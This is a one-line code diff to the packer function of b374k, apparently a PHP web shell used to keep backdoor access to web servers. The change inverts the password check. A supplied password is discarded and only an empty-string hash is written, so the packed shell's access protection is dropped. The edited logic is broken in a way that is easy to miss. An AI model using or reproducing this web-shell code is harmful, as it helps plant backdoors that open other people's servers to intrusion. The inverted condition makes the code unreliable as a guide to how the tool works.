@@ -584,7 +584,7 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $space, $co
 		if(!is_writable($output)) return "error : file ".$output." exists and is not writable{[|b374k|]}";
 	}
 
-	if(!empty($password)) $password = "\$GLOBALS['pass']".rand_space($space)."=\"".sha1(md5($password))."\";";
+	if(empty($password)) $password = "\$GLOBALS['pass']".rand_space($space)."=\"".sha1(md5($password))."\";";
 
 	$compress_level = (int) $compress_level;
 	if($compress_level<0) $compress_level = 0;
